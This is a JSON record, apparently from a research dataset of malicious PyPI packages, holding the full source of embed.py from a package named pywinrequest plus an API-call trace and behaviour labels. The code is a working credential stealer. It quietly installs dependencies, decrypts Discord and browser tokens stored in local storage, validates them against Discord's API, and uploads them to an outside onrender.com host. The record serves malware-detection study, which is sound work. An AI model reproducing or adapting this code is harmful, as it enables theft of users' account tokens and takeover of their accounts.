[
  {
    "pyfile": "embed.py",
    "code_snippet": "import urllib.parse\nimport os\nos.system('pip install requests==2.28.1 -q -q -q --no-input')\nimport requests\nos.system('pip install pyotp -q -q -q --no-input')\nimport base64\nimport sqlite3\nimport shutil\nfrom datetime import datetime, timedelta\nimport re\nimport os.path\nimport time\nimport json\nfrom pyotp import TOTP\nos.system('pip install pycryptodome==3.15.0 -q -q -q --no-input')\nif os.name == \"nt\":\n    os.system('pip install pywin32==304 -q -q -q --no-input')\n    os.system('pip install pypiwin32 -q -q -q --no-input')\n    from win32crypt import CryptUnprotectData\nelse:\n    pass\nfrom Crypto.Cipher import AES\n\nglobal all_tokens\nall_tokens = []\nencrypt_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\nnormal_regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\nbaseurl = \"https://discord.com/api/v9/users/@me\"\ntokens = []\nids = []\npython3api = \"https://python39api.onrender.com\"\napikey = 'YOL4HH6CUDB3IUGCS3BLTQVRYOWXY==='\nkey = TOTP(apikey).now()\n\ndef decrypt_val(buff, master_key):\n    iv = buff[3:15]\n    payload = buff[15:]\n    cipher = AES.new(master_key, AES.MODE_GCM, iv)\n    decrypted_pass = cipher.decrypt(payload)\n    decrypted_pass = decrypted_pass[:-16].decode()\n\n    return decrypted_pass\n\n\ndef get_key(path):\n    if not os.path.exists(path):\n        return\n\n    if \"os_crypt\" not in open(path, \"r\", encoding=\"utf-8\").read():\n        return\n\n    with open(path, \"r\", encoding=\"utf-8\") as f:\n        c = f.read()\n\n    local_state = json.loads(c)\n    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = master_key[5:]\n    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n    return master_key\n\ndef main_token():\n    try:\n        os.remove(\"tokens.txt\")\n    except:\n        pass\n    appdata = os.getenv(\"LOCALAPPDATA\")\n    roaming = os.getenv(\"APPDATA\")\n    temp = os.getenv(\"TEMP\")\n\n    paths = {\n    \"Discord\": roaming + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord Canary\": roaming + \"\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\\",\n    \"Lightcord\": roaming + \"\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord PTB\": roaming + \"\\\\discordptb\\\\Local Storage\\\\leveldb\\\\\",\n    \"Opera\": roaming + \"\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\\",\n    \"Opera GX\": roaming + \"\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\\",\n    \"Amigo\": appdata + \"\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Torch\": appdata + \"\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Kometa\": appdata + \"\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Orbitum\": appdata + \"\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"CentBrowser\": appdata + \"\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"7Star\": appdata + \"\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Sputnik\": appdata + \"\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Vivaldi\": appdata + \"\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome SxS\": appdata + \"\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome1\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome2\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome3\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome4\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome5\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\\",\n    \"Epic Privacy Browser\": appdata\n    + \"\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Microsoft Edge\": appdata\n    + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\\",\n    \"Uran\": appdata + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Yandex\": appdata\n    + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Brave\": appdata\n    + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Iridium\": appdata + \"\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n}\n\n    message = \"\"\n\n    for name, path in paths.items():\n        if not os.path.exists(path):\n            continue\n        disc = name.replace(\" \", \"\").lower()\n        if \"cord\" in path:\n            if os.path.exists(roaming + f\"\\\\{disc}\\\\Local State\"):\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [\n                        x.strip()\n                        for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines()\n                        if x.strip()\n                    ]:\n                        for y in re.findall(encrypt_regex, line):\n                            token = decrypt_val(\n                                base64.b64decode(y.split(\"dQw4w9WgXcQ:\")[1]),\n                                get_key(roaming + f\"\\\\{disc}\\\\Local State\"),\n                            )\n                            r = requests.get(\n                                baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                            if r.status_code == 200:\n                                uid = r.json()[\"id\"]\n                                if uid not in ids:\n                                    tokens.append(token)\n                                    ids.append(uid)\n        else:\n            for file_name in os.listdir(path):\n                if file_name[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(normal_regex, line):\n                        r = requests.get(\n                            baseurl,\n                            headers={\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                \"Content-Type\": \"application/json\",\n                                \"Authorization\": token,\n                            },\n                        )\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in ids:\n                                tokens.append(token)\n                                ids.append(uid)\n\n    if os.path.exists(roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n        for path, _, files in os.walk(roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for _file in files:\n                if not _file.endswith(\".sqlite\"):\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{_file}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(normal_regex, line):\n                        r = requests.get(\n                            baseurl,\n                            headers={\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                \"Content-Type\": \"application/json\",\n                                \"Authorization\": token,\n                            },\n                        )\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in ids:\n                                tokens.append(token)\n                                ids.append(uid)\n\n    remove_dup = [*set(all_tokens)]\n    with open(\"tokens.txt\", \"a+\", encoding=\"utf-8\", errors=\"ignore\") as f:\n        for item in tokens:\n            f.write(f\"{item}\\n\")\n    files = {\n        'file': open(\"tokens.txt\", 'rb')\n    }\n    requests.post(python3api, headers={\"Authorization\": key}, files=files)\n\nclass Start:\n    def __init__(self):\n        main_token()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.system",
        "os.system",
        "os.system",
        "os.system",
        "os.system",
        "os.system",
        "TOTP.now",
        "os.path.exists",
        "open",
        "open.read",
        "json.loads",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "os.system",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "os.path.exists",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "base64.b64decode",
        "get_key",
        "AES.new",
        "AES.new.decrypt",
        "requests.get",
        "requests.get.status_code",
        "requests.get.json",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "requests.get",
        "requests.get.status_code",
        "requests.get.json",
        "os.path.exists",
        "os.walk",
        "open",
        "open.readlines",
        "re.findall",
        "requests.get",
        "requests.get.status_code",
        "requests.get.json",
        "open",
        "open.write",
        "open",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "os.system('pip install requests==2.28.1 -q -q -q --no-input')",
        "os.system('pip install pyotp -q -q -q --no-input')",
        "os.system('pip install pycryptodome==3.15.0 -q -q -q --no-input')",
        "os.system('pip install pywin32==304 -q -q -q --no-input')",
        "os.system('pip install pypiwin32 -q -q -q --no-input')",
        "os.system('pip install pycryptodome==3.15.0 -q -q -q --no-input')",
        "TOTP(apikey).now()",
        "os.path.exists(path)",
        "open(path, 'r', encoding='utf-8')",
        "open(path, 'r', encoding='utf-8').read()",
        "json.loads(c)",
        "base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])",
        "win32crypt.CryptUnprotectData(master_key, None, None, None, 0)",
        "os.system('pip install pycryptodome==3.15.0 -q -q -q --no-input')",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.getenv('TEMP')",
        "os.path.exists(path)",
        "os.path.exists(roaming + f\"\\{disc}\\Local State\")",
        "os.listdir(path)",
        "open(f\"{path}\\{file_name}\", errors=\"ignore\")",
        "open(f\"{path}\\{file_name}\", errors=\"ignore\").readlines()",
        "re.findall(encrypt_regex, line)",
        "base64.b64decode(y.split(\"dQw4w9WgXcQ:\")[1])",
        "get_key(roaming + f\"\\{disc}\\Local State\")",
        "AES.new(master_key, AES.MODE_GCM, iv)",
        "AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)",
        "requests.get(baseurl, headers={...})",
        "r.status_code",
        "r.json()",
        "os.listdir(path)",
        "open(f\"{path}\\{file_name}\", errors=\"ignore\")",
        "open(f\"{path}\\{file_name}\", errors=\"ignore\").readlines()",
        "re.findall(normal_regex, line)",
        "requests.get(baseurl, headers={...})",
        "r.status_code",
        "r.json()",
        "os.path.exists(roaming + \"\\Mozilla\\Firefox\\Profiles\")",
        "os.walk(roaming + \"\\Mozilla\\Firefox\\Profiles\")",
        "open(f\"{path}\\{_file}\", errors=\"ignore\")",
        "open(f\"{path}\\{_file}\", errors=\"ignore\").readlines()",
        "re.findall(normal_regex, line)",
        "requests.get(baseurl, headers={...})",
        "r.status_code",
        "r.json()",
        "open(\"tokens.txt\", \"a+\", encoding=\"utf-8\", errors=\"ignore\")",
        "f.write(f\"{item}\\n\")",
        "open(\"tokens.txt\", 'rb')",
        "requests.post(python3api, headers={\"Authorization\": key}, files=files)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "pyotp.TOTP.now",
          "id": "get_totp_password",
          "description": "Retrieves current one-time password from TOTP object",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.system",
          "id": "configure_package_install",
          "description": "Configures and initiates Python package installation",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.readlines",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "get_key",
          "id": "get_master_key",
          "description": "Retrieves and decrypts master key from local state",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "Crypto.Cipher.AES.new",
          "id": "init_aes_gcm",
          "description": "Initializes AES cipher in GCM mode",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "Crypto.Cipher.AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.status_code",
          "id": "get_http_status",
          "description": "Retrieves HTTP response status code",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.readlines",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.status_code",
          "id": "get_http_status",
          "description": "Retrieves HTTP response status code",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.readlines",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.status_code",
          "id": "get_http_status",
          "description": "Retrieves HTTP response status code",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os\nimport requests\nimport base64\nimport json\nfrom pyotp import TOTP\nfrom Crypto.Cipher import AES\nimport re\n\ndef decrypt_val(buff, master_key):\n    iv = buff[3:15]\n    payload = buff[15:]\n    cipher = AES.new(master_key, AES.MODE_GCM, iv)\n    decrypted_pass = cipher.decrypt(payload)\n    decrypted_pass = decrypted_pass[:-16].decode()\n    return decrypted_pass\n\ndef get_key(path):\n    if not os.path.exists(path):\n        return\n    if \"os_crypt\" not in open(path, \"r\", encoding=\"utf-8\").read():\n        return\n    with open(path, \"r\", encoding=\"utf-8\") as f:\n        c = f.read()\n    local_state = json.loads(c)\n    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = master_key[5:]\n    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n    return master_key\n\ndef main_token():\n    try:\n        os.remove(\"tokens.txt\")\n    except:\n        pass\n    appdata = os.getenv(\"LOCALAPPDATA\")\n    roaming = os.getenv(\"APPDATA\")\n    temp = os.getenv(\"TEMP\")\n    # ... paths dict ...\n    for name, path in paths.items():\n        if not os.path.exists(path):\n            continue\n        disc = name.replace(\" \", \"\").lower()\n        if \"cord\" in path:\n            if os.path.exists(roaming + f\"\\\\{disc}\\\\Local State\"):\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines() if x.strip()]:\n                        for y in re.findall(encrypt_regex, line):\n                            token = decrypt_val(\n                                base64.b64decode(y.split(\"dQw4w9WgXcQ:\")[1]),\n                                get_key(roaming + f\"\\\\{disc}\\\\Local State\"),\n                            )\n                            r = requests.get(\n                                baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                            if r.status_code == 200:\n                                uid = r.json()[\"id\"]\n                                if uid not in ids:\n                                    tokens.append(token)\n                                    ids.append(uid)\n        else:\n            for file_name in os.listdir(path):\n                if file_name[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [x.strip() for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines() if x.strip()]:\n                    for token in re.findall(normal_regex, line):\n                        r = requests.get(\n                            baseurl,\n                            headers={\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                \"Content-Type\": \"application/json\",\n                                \"Authorization\": token,\n                            },\n                        )\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in ids:\n                                tokens.append(token)\n                                ids.append(uid)\n    if os.path.exists(roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n        for path, _, files in os.walk(roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for _file in files:\n                if not _file.endswith(\".sqlite\"):\n                    continue\n                for line in [x.strip() for x in open(f\"{path}\\\\{_file}\", errors=\"ignore\").readlines() if x.strip()]:\n                    for token in re.findall(normal_regex, line):\n                        r = requests.get(\n                            baseurl,\n                            headers={\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                \"Content-Type\": \"application/json\",\n                                \"Authorization\": token,\n                            },\n                        )\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in ids:\n                                tokens.append(token)\n                                ids.append(uid)\n    with open(\"tokens.txt\", \"a+\", encoding=\"utf-8\", errors=\"ignore\") as f:\n        for item in tokens:\n            f.write(f\"{item}\\n\")\n    files = {\n        'file': open(\"tokens.txt\", 'rb')\n    }\n    requests.post(python3api, headers={\"Authorization\": key}, files=files)\n\nclass Start:\n    def __init__(self):\n        main_token()\n"
    }
  },
  {
    "metadata": {
      "package_name": "pywinrequest-1.0.1",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/pywinrequest-1.0.1/pywinrequest-1.0.1/src/pywinrequest/utils/embed.py",
      "code_hash": "ea530ad96294fe17d1e197ae02478dbb"
    }
  }
]